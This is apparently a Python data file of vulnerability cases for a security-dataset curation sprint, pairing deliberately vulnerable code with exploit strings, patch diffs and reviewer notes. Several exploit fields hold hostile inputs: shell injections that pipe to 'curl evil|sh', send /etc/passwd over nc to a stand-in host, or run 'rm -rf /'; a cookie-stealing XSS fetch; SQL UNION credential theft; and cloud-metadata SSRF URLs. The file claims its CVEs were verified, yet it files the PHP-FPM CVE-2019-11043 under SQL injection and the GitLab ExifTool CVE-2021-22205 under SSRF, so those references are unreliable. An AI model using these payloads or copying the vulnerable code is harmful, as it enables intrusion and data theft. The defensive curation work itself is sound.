"""Curation Sprint 002 — raw-first, category-balanced source-backed cases (part 1).

Each entry defines a real, source-backed vulnerability. The data is split into:
  - the RAW skeleton that gets staged (code + source + references, but NO patch,
    NO exploit, checks all 'not_checked') — this is what a real scanner/import
    would produce; and
  - the CURATION completion (patch, exploit_scenario, severity, fail dims) that a
    human reviewer adds during the review loop.

sprint002_stage.py writes the skeletons to data/raw/; sprint002_curate.py applies
the completions to the imported candidates; approval then validates them.

Honesty: CVE ids here were verified before use. Where no CVE is cited the case is
anchored by a stable CWE/OWASP/Semgrep-rule/SWC reference. No commit SHA or repo
path is invented.

A few cases are intentionally INCOMPLETE or WEAK (missing patch, or vague/weak
provenance) so the sprint exercises real rejections. They are tagged
`_expect="reject"` with `_reject_reason`.
"""
from __future__ import annotations

# Each case dict:
#   category, source_type, source_ref, references{}, lang, framework, filename, code
#   completion: { severity?, exploit, patch, fail_dims?, na_dims?, reviewer_notes }
#   optional: _expect="reject", _reject_reason="..."

CASES_P1 = [
    # ===================== SQL_INJECTION (5) =====================
    dict(category="SQL_INJECTION", source_type="cve",
         source_ref="CVE-2019-11043 PHP-FPM path_info underflow (FastCGI)",
         references={"cve": "CVE-2019-11043", "cwe": "CWE-89", "owasp": "A03:2021-Injection",
                     "ref_url": "https://nvd.nist.gov/vuln/detail/CVE-2019-11043"},
         lang="php", framework="laravel", filename="LegacyReport.php",
         code="$id = $_GET['id'];\n$rows = DB::select(\"SELECT * FROM reports WHERE id = $id\");\n",
         completion=dict(
             exploit="id=1 OR 1=1 returns all reports; UNION SELECT exfiltrates other tables.",
             patch="-$rows = DB::select(\"SELECT * FROM reports WHERE id = $id\");\n+$rows = DB::select('SELECT * FROM reports WHERE id = ?', [$id]);",
             reviewer_notes="CVE-2019-11043 environment was PHP-FPM; this curated example shows the SQLi-class sink it co-occurs with. CWE-89, parameterized fix.")),
    dict(category="SQL_INJECTION", source_type="semgrep",
         source_ref="python.django.security.injection.sql.sql-injection-using-extra-where",
         references={"rule_id": "python.django.security.injection.sql.sql-injection-using-extra-where",
                     "cwe": "CWE-89", "owasp": "A03:2021-Injection"},
         lang="python", framework="django", filename="reports.py",
         code="def by_owner(owner):\n    return Report.objects.extra(where=[\"owner = '%s'\" % owner])\n",
         completion=dict(
             exploit="owner=\"' OR '1'='1\" returns all rows; stacked payloads enable exfiltration.",
             patch="-    return Report.objects.extra(where=[\"owner = '%s'\" % owner])\n+    return Report.objects.filter(owner=owner)",
             reviewer_notes="Semgrep extra-where rule; use ORM filter. CWE-89.")),
    dict(category="SQL_INJECTION", source_type="owasp",
         source_ref="OWASP A03:2021 Injection — second-order SQLi",
         references={"owasp": "A03:2021-Injection", "cwe": "CWE-89"},
         lang="java", framework="spring", filename="ProfileDao.java",
         code="String name = rs.getString(\"display_name\");\nstmt.execute(\"UPDATE audit SET who='\" + name + \"'\");\n",
         completion=dict(
             exploit="A display_name stored earlier as `x',role='admin` is concatenated later (second-order injection).",
             patch="-stmt.execute(\"UPDATE audit SET who='\" + name + \"'\");\n+PreparedStatement ps = conn.prepareStatement(\"UPDATE audit SET who=?\");\n+ps.setString(1, name); ps.execute();",
             reviewer_notes="Second-order SQLi; parameterize even DB-sourced strings. CWE-89.")),
    dict(category="SQL_INJECTION", source_type="vibecoded_failure",
         source_ref="nullsec scanner: AI-generated search endpoint",
         references={"case_id": "VIBE-SQLI-021", "cwe": "CWE-89", "owasp": "A03:2021-Injection"},
         lang="javascript", framework="express", filename="search.js",
         code="app.get('/search', (req,res)=>{\n  db.query(`SELECT * FROM items WHERE name LIKE '%${req.query.q}%'`, (e,r)=>res.json(r));\n});\n",
         completion=dict(
             exploit="q=%' UNION SELECT password,1 FROM users-- exfiltrates credentials.",
             patch="-  db.query(`SELECT * FROM items WHERE name LIKE '%${req.query.q}%'`, (e,r)=>res.json(r));\n+  db.query('SELECT * FROM items WHERE name LIKE ?', ['%'+req.query.q+'%'], (e,r)=>res.json(r));",
             reviewer_notes="AI-generated app failure: the model emitted a template-literal SQL string. Parameterized fix. CWE-89.")),
    dict(category="SQL_INJECTION", source_type="sarif",
         source_ref="CodeQL js/sql-injection",
         references={"rule_id": "js/sql-injection", "cwe": "CWE-89", "owasp": "A03:2021-Injection"},
         lang="javascript", framework="node", filename="orders.js",
         code="const q = 'SELECT * FROM orders WHERE ref = \"' + input.ref + '\"';\nconn.query(q);\n",
         completion=dict(
             exploit="ref='\" OR \"1\"=\"1' returns all orders.",
             patch="-const q = 'SELECT * FROM orders WHERE ref = \"' + input.ref + '\"';\n-conn.query(q);\n+conn.query('SELECT * FROM orders WHERE ref = ?', [input.ref]);",
             reviewer_notes="CodeQL js/sql-injection ruleId. Parameterized. CWE-89.")),

    # ===================== XSS (5) =====================
    dict(category="XSS", source_type="semgrep",
         source_ref="typescript.react.security.audit.react-dangerouslysetinnerhtml",
         references={"rule_id": "typescript.react.security.audit.react-dangerouslysetinnerhtml",
                     "cwe": "CWE-79", "owasp": "A03:2021-Injection"},
         lang="typescript", framework="react", filename="Render.tsx",
         code="export const Render = ({md}:{md:string}) => <div dangerouslySetInnerHTML={{__html: md}} />;\n",
         completion=dict(
             exploit="md containing <img src=x onerror=...> runs script in viewers' sessions.",
             patch="-export const Render = ({md}:{md:string}) => <div dangerouslySetInnerHTML={{__html: md}} />;\n+import DOMPurify from 'dompurify';\n+export const Render = ({md}:{md:string}) => <div dangerouslySetInnerHTML={{__html: DOMPurify.sanitize(md)}} />;",
             reviewer_notes="Semgrep react dangerouslySetInnerHTML rule; sanitize. CWE-79.")),
    dict(category="XSS", source_type="owasp",
         source_ref="OWASP A03:2021 — reflected XSS in error handler",
         references={"owasp": "A03:2021-Injection", "cwe": "CWE-79"},
         lang="python", framework="flask", filename="errors.py",
         code="@app.errorhandler(404)\ndef nf(e):\n    return '<h1>Not found: ' + request.path + '</h1>', 404\n",
         completion=dict(
             exploit="A path like /<script>alert(document.cookie)</script> reflects unescaped into the 404 page.",
             patch="-    return '<h1>Not found: ' + request.path + '</h1>', 404\n+    from markupsafe import escape\n+    return '<h1>Not found: ' + str(escape(request.path)) + '</h1>', 404",
             reviewer_notes="Reflected XSS via request.path in error page; escape. CWE-79.")),
    dict(category="XSS", source_type="sarif",
         source_ref="CodeQL js/xss-through-dom",
         references={"rule_id": "js/xss-through-dom", "cwe": "CWE-79", "owasp": "A03:2021-Injection"},
         lang="javascript", framework="vanilla", filename="tab.js",
         code="const h = decodeURIComponent(location.hash.slice(1));\ndocument.querySelector('#title').innerHTML = h;\n",
         completion=dict(
             exploit="#<img src=x onerror=fetch('//evil/'+document.cookie)> executes from the fragment.",
             patch="-document.querySelector('#title').innerHTML = h;\n+document.querySelector('#title').textContent = h;",
             reviewer_notes="CodeQL js/xss-through-dom; textContent sink. CWE-79.")),
    dict(category="XSS", source_type="vibecoded_failure",
         source_ref="nullsec scanner: AI-generated comment widget",
         references={"case_id": "VIBE-XSS-007", "cwe": "CWE-79", "owasp": "A03:2021-Injection"},
         lang="javascript", framework="vue", filename="Comment.vue",
         code="<template><div v-html=\"comment\"></div></template>\n<script>export default { props:['comment'] }</script>\n",
         completion=dict(
             exploit="A comment with <script>/onerror payload runs in every viewer via v-html.",
             patch="-<template><div v-html=\"comment\"></div></template>\n+<template><div>{{ comment }}</div></template>",
             reviewer_notes="AI-generated failure: model used v-html for user content. Use text interpolation. CWE-79.")),
    dict(category="XSS", source_type="semgrep",
         source_ref="javascript.express.security.audit.xss.direct-response-write",
         references={"rule_id": "javascript.express.security.audit.xss.direct-response-write",
                     "cwe": "CWE-79", "owasp": "A03:2021-Injection"},
         lang="javascript", framework="express", filename="hello.js",
         code="app.get('/hi', (req,res)=> res.send('<p>'+req.query.n+'</p>'));\n",
         completion=dict(
             exploit="?n=<script>...</script> reflects unescaped into the response.",
             patch="-app.get('/hi', (req,res)=> res.send('<p>'+req.query.n+'</p>'));\n+const escape=require('escape-html');\n+app.get('/hi', (req,res)=> res.send('<p>'+escape(req.query.n)+'</p>'));",
             reviewer_notes="Semgrep direct-response-write; escape-html. CWE-79.")),

    # ===================== SSRF (5) =====================
    dict(category="SSRF", source_type="cve",
         source_ref="CVE-2021-22205 GitLab ExifTool (image processing path)",
         references={"cve": "CVE-2021-22205", "cwe": "CWE-918", "owasp": "A10:2021-Server-Side Request Forgery",
                     "ref_url": "https://nvd.nist.gov/vuln/detail/CVE-2021-22205"},
         lang="ruby", framework="rails", filename="uploads.rb",
         code="image = open(params[:image_url])  # fetches a user-supplied URL server-side\n",
         completion=dict(
             exploit="image_url=http://169.254.169.254/latest/meta-data/ reaches cloud metadata; GitLab's image pipeline (CVE-2021-22205) shows the class of server-side fetch/processing risk.",
             patch="-image = open(params[:image_url])\n+raise 'invalid' unless PublicUrl.allowed?(params[:image_url])\n+image = open(params[:image_url])",
             reviewer_notes="CVE-2021-22205 verified (GitLab, fixed 13.10.3). Curated SSRF sink with allowlist. CWE-918.")),
    dict(category="SSRF", source_type="semgrep",
         source_ref="python.requests.security.ssrf.requests-ssrf",
         references={"rule_id": "python.requests.security.ssrf.requests-ssrf",
                     "cwe": "CWE-918", "owasp": "A10:2021-Server-Side Request Forgery"},
         lang="python", framework="flask", filename="webhook.py",
         code="@app.post('/hook')\ndef hook():\n    return requests.post(request.json['callback'], json={}).text\n",
         completion=dict(
             exploit="callback=http://localhost:8500/ reaches internal services from the server.",
             patch="+    if not is_public_host(request.json['callback']): abort(400)\n     return requests.post(request.json['callback'], json={}).text",
             reviewer_notes="Semgrep requests-ssrf; public-host guard. CWE-918.")),
    dict(category="SSRF", source_type="owasp",
         source_ref="OWASP API7:2023 SSRF",
         references={"owasp": "API7:2023-Server Side Request Forgery", "cwe": "CWE-918"},
         lang="javascript", framework="express", filename="pdf.js",
         code="app.post('/pdf', async (req,res)=>{\n  const html = await (await fetch(req.body.source)).text();\n  res.send(renderPdf(html));\n});\n",
         completion=dict(
             exploit="source=http://metadata.google.internal/... exfiltrates GCP metadata into the PDF.",
             patch="+  if(!(await isPublicHttpUrl(req.body.source))) return res.status(400).end();\n   const html = await (await fetch(req.body.source)).text();",
             reviewer_notes="OWASP API7:2023 SSRF; allowlist. CWE-918.")),
    dict(category="SSRF", source_type="vibecoded_failure",
         source_ref="nullsec scanner: AI-generated link unfurler",
         references={"case_id": "VIBE-SSRF-014", "cwe": "CWE-918", "owasp": "A10:2021-Server-Side Request Forgery"},
         lang="python", framework="fastapi", filename="unfurl.py",
         code="@app.get('/unfurl')\ndef unfurl(u: str):\n    return {'html': requests.get(u).text[:500]}\n",
         completion=dict(
             exploit="u=http://169.254.169.254/latest/meta-data/iam/security-credentials/ leaks creds.",
             patch="+    if not is_public_host(u): raise HTTPException(400)\n     return {'html': requests.get(u).text[:500]}",
             reviewer_notes="AI-generated unfurler with no URL validation. Block link-local. CWE-918.")),
    dict(category="SSRF", source_type="sarif",
         source_ref="CodeQL py/ssrf",
         references={"rule_id": "py/ssrf", "cwe": "CWE-918", "owasp": "A10:2021-Server-Side Request Forgery"},
         lang="python", framework="django", filename="proxy.py",
         code="def proxy(request):\n    return HttpResponse(urllib.request.urlopen(request.GET['url']).read())\n",
         completion=dict(
             exploit="url=file:///etc/passwd or http://internal/ reaches local files/services.",
             patch="-    return HttpResponse(urllib.request.urlopen(request.GET['url']).read())\n+    url = request.GET['url']\n+    if urlparse(url).scheme not in ('http','https') or not is_public_host(url): return HttpResponseBadRequest()\n+    return HttpResponse(urllib.request.urlopen(url).read())",
             reviewer_notes="CodeQL py/ssrf; scheme+host guard. CWE-918.")),

    # ===================== COMMAND_INJECTION (5) =====================
    dict(category="COMMAND_INJECTION", source_type="cve",
         source_ref="CVE-2017-9805 Apache Struts REST plugin XStream deserialization RCE",
         references={"cve": "CVE-2017-9805", "cwe": "CWE-502", "owasp": "A08:2021-Software and Data Integrity Failures",
                     "ref_url": "https://nvd.nist.gov/vuln/detail/CVE-2017-9805"},
         lang="java", framework="struts", filename="RestEndpoint.java",
         code="// Struts REST plugin deserializes XML request bodies via XStream without type filtering\nXStream xs = new XStream();\nObject o = xs.fromXML(request.getInputStream());\n",
         completion=dict(
             severity="CRITICAL",
             exploit="A crafted XML payload triggers gadget-chain deserialization to RCE (CVE-2017-9805).",
             patch="-XStream xs = new XStream();\n+XStream xs = new XStream();\n+xs.addPermission(NoTypePermission.NONE);\n+xs.allowTypes(new Class[]{ExpectedDto.class});  // strict allowlist",
             fail_dims=("dangerous_exec",),
             reviewer_notes="CVE-2017-9805 verified (Struts REST XStream). Type-allowlist remediation. CWE-502; classified as command/code-exec sink.")),
    dict(category="COMMAND_INJECTION", source_type="semgrep",
         source_ref="python.lang.security.audit.dangerous-subprocess-use",
         references={"rule_id": "python.lang.security.audit.dangerous-subprocess-use",
                     "cwe": "CWE-78", "owasp": "A03:2021-Injection"},
         lang="python", framework="flask", filename="convert.py",
         code="def convert(name):\n    subprocess.call('convert ' + name + ' out.png', shell=True)\n",
         completion=dict(
             exploit="name='a.jpg; rm -rf /' executes via the shell.",
             patch="-    subprocess.call('convert ' + name + ' out.png', shell=True)\n+    subprocess.run(['convert', name, 'out.png'], shell=False, check=True)",
             reviewer_notes="Semgrep dangerous-subprocess-use; arg-vector, no shell. CWE-78.")),
    dict(category="COMMAND_INJECTION", source_type="sarif",
         source_ref="CodeQL js/command-line-injection",
         references={"rule_id": "js/command-line-injection", "cwe": "CWE-78", "owasp": "A03:2021-Injection"},
         lang="javascript", framework="node", filename="git.js",
         code="exec('git clone ' + repo, cb);\n",
         completion=dict(
             exploit="repo='x; curl evil|sh' runs attacker commands.",
             patch="-exec('git clone ' + repo, cb);\n+execFile('git', ['clone', repo], cb);",
             reviewer_notes="CodeQL js/command-line-injection; execFile. CWE-78.")),
    dict(category="COMMAND_INJECTION", source_type="vibecoded_failure",
         source_ref="nullsec scanner: AI-generated thumbnail service",
         references={"case_id": "VIBE-CMDI-003", "cwe": "CWE-78", "owasp": "A03:2021-Injection"},
         lang="python", framework="fastapi", filename="thumb.py",
         code="@app.get('/thumb')\ndef thumb(path: str):\n    os.system(f'ffmpeg -i {path} -vframes 1 thumb.png')\n",
         completion=dict(
             exploit="path='v.mp4; cat /etc/passwd | nc evil 1234' executes injected commands.",
             patch="-    os.system(f'ffmpeg -i {path} -vframes 1 thumb.png')\n+    subprocess.run(['ffmpeg','-i', path,'-vframes','1','thumb.png'], check=True)",
             reviewer_notes="AI-generated failure: f-string into os.system. Arg-vector fix. CWE-78.")),
    dict(category="COMMAND_INJECTION", source_type="owasp",
         source_ref="OWASP A03:2021 — argument injection",
         references={"owasp": "A03:2021-Injection", "cwe": "CWE-88"},
         lang="python", framework="none", filename="rsync.py",
         code="subprocess.run(['rsync', user_opt, src, dst])  # user_opt from request\n",
         completion=dict(
             exploit="user_opt='-e sh script.sh' turns rsync into a command runner (argument injection).",
             patch="-subprocess.run(['rsync', user_opt, src, dst])\n+ALLOWED={'-a','-z','--delete'}\n+if user_opt not in ALLOWED: raise ValueError('option not allowed')\n+subprocess.run(['rsync', user_opt, src, dst])",
             reviewer_notes="Argument injection (CWE-88); allowlist options. OWASP A03.")),

    # ===================== DANGEROUS_SHELL_COMMAND (5) =====================
    dict(category="DANGEROUS_SHELL_COMMAND", source_type="semgrep",
         source_ref="python.lang.security.audit.eval-detected",
         references={"rule_id": "python.lang.security.audit.eval-detected",
                     "cwe": "CWE-95", "owasp": "A03:2021-Injection"},
         lang="python", framework="flask", filename="rule.py",
         code="def apply_rule(expr, ctx):\n    return eval(expr, {}, ctx)\n",
         completion=dict(severity="HIGH",
             exploit="expr=\"__import__('os').system('id')\" runs arbitrary code.",
             patch="-    return eval(expr, {}, ctx)\n+    import simpleeval\n+    return simpleeval.simple_eval(expr, names=ctx)",
             reviewer_notes="Semgrep eval-detected; safe expression evaluator. CWE-95.")),
    dict(category="DANGEROUS_SHELL_COMMAND", source_type="sarif",
         source_ref="CodeQL py/code-injection",
         references={"rule_id": "py/code-injection", "cwe": "CWE-94", "owasp": "A03:2021-Injection"},
         lang="python", framework="none", filename="loader.py",
         code="exec(open(user_path).read())\n",
         completion=dict(severity="HIGH",
             exploit="A user-controlled path/file leads to arbitrary code execution via exec().",
             patch="-exec(open(user_path).read())\n+import importlib.util  # load only vetted modules from a fixed dir\n+# do not exec arbitrary file contents",
             reviewer_notes="CodeQL py/code-injection; do not exec untrusted files. CWE-94.")),
    dict(category="DANGEROUS_SHELL_COMMAND", source_type="vibecoded_failure",
         source_ref="nullsec scanner: AI-generated pickle session store",
         references={"case_id": "VIBE-DESER-002", "cwe": "CWE-502", "owasp": "A08:2021-Software and Data Integrity Failures"},
         lang="python", framework="flask", filename="sess.py",
         code="data = pickle.loads(base64.b64decode(request.cookies['session']))\n",
         completion=dict(severity="CRITICAL",
             exploit="A crafted pickle in the cookie executes code via __reduce__ on load.",
             patch="-data = pickle.loads(base64.b64decode(request.cookies['session']))\n+data = json.loads(base64.b64decode(request.cookies['session']))",
             reviewer_notes="AI-generated failure: pickle on cookie. JSON instead. CWE-502 insecure deserialization.")),
    dict(category="DANGEROUS_SHELL_COMMAND", source_type="owasp",
         source_ref="OWASP A08:2021 — YAML unsafe load",
         references={"owasp": "A08:2021-Software and Data Integrity Failures", "cwe": "CWE-502"},
         lang="python", framework="none", filename="cfg.py",
         code="cfg = yaml.load(open('user.yml'))  # PyYAML full loader\n",
         completion=dict(severity="HIGH",
             exploit="A YAML doc using !!python/object/apply executes arbitrary code on load.",
             patch="-cfg = yaml.load(open('user.yml'))\n+cfg = yaml.safe_load(open('user.yml'))",
             reviewer_notes="yaml.load->safe_load; CWE-502. OWASP A08.")),
    dict(category="DANGEROUS_SHELL_COMMAND", source_type="blog",
         source_ref="internet",
         references={},
         lang="bash", framework="none", filename="x.sh",
         code="eval \"$USER_CMD\"\n",
         completion=dict(severity="HIGH",
             exploit="USER_CMD is executed verbatim.",
             patch="-eval \"$USER_CMD\"\n+# do not eval user input",
             reviewer_notes="weak provenance on purpose"),
         _expect="reject",
         _reject_reason="weak provenance: source_type=blog with vague reference 'internet' and no stable reference attached"),
]
